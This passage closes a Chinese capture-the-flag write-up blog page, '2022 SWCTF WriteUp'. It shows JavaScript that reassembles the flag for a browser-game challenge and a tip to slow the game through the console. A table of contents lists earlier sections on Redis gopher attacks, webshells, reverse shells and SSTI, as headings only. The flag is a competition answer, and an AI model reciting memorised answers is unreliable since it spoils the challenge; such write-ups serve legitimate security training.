<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="string">&#x27;eat_&#x27;</span>,<span class="string">&#x27;!&#125;&#x27;</span>,<span class="string">&#x27;e_on&#x27;</span>,<span class="string">&#x27;re_gr&#x27;</span>,<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="string">&#x27;you_a&#x27;</span>,<span class="string">&#x27;sne&#x27;</span>];</span><br><span class="line">flag=((((flag[<span class="number">8</span>]+flag[<span class="number">6</span>])+flag[<span class="number">1</span>]+flag[<span class="number">7</span>])+flag[<span class="number">5</span>]+flag[<span class="number">2</span>])+flag[<span class="number">0</span>]+flag[<span class="number">4</span>]+flag[<span class="number">3</span>]);</span><br></pre></td></tr></table></figure>

<p>也可以通过在控制台中减小javascript中的的speed变量然后玩游戏拿到110分，因为通过审计代码我们可以发现speed是控制游戏运行速度的变量。</p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Articles</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#snert%E7%BF%BB%E8%AF%91"><span class="toc-number">1.</span> <span class="toc-text">snert翻译</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%B4%A2"><span class="toc-number">1.1.</span> <span class="toc-text">获取线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8gopher%E5%8D%8F%E8%AE%AE%E6%94%BB%E5%87%BBredis%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.2.</span> <span class="toc-text">利用gopher协议攻击redis数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E8%84%9A%E6%9C%AC%E5%B0%86webshell%E5%86%99%E5%85%A5%E4%B8%BB%E6%9C%BA%E4%B8%AD"><span class="toc-number">1.3.</span> <span class="toc-text">写脚本将webshell写入主机中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7Gopherus%E5%BE%97%E5%88%B0payload"><span class="toc-number">1.4.</span> <span class="toc-text">利用工具Gopherus得到payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BA%BA%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">主人的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%B4%A2-1"><span class="toc-number">2.1.</span> <span class="toc-text">获取线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81"><span class="toc-number">2.2.</span> <span class="toc-text">审计代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99EXP"><span class="toc-number">2.3.</span> <span class="toc-text">编写EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">2.4.</span> <span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.5.</span> <span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#difficult-ssti"><span class="toc-number">3.</span> <span class="toc-text">difficult_ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%B4%A2-2"><span class="toc-number">3.1.</span> <span class="toc-text">获取线索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text">绕过过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-eval%E5%87%BD%E6%95%B0%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.</span> <span class="toc-text">SSTI+eval函数反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezphp"><span class="toc-number">4.</span> <span class="toc-text">ezphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Error%E7%B1%BB%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">Error类：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception-%E7%B1%BB"><span class="toc-number">4.2.</span> <span class="toc-text">Exception 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getflag"><span class="toc-number">4.3.</span> <span class="toc-text">Getflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF"><span class="toc-number">5.</span> <span class="toc-text">别踩白块儿</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2022/05/07/swctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2022/05/07/swctf/&text=2022 SWCTF WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2022/05/07/swctf/&is_video=false&description=2022 SWCTF WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2022 SWCTF WriteUp&body=Check out this article: https://r4inb00w.github.io/2022/05/07/swctf/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2022/05/07/swctf/&title=2022 SWCTF WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2022/05/07/swctf/&name=2022 SWCTF WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2022/05/07/swctf/&t=2022 SWCTF WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    1970-2099
    rainb0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
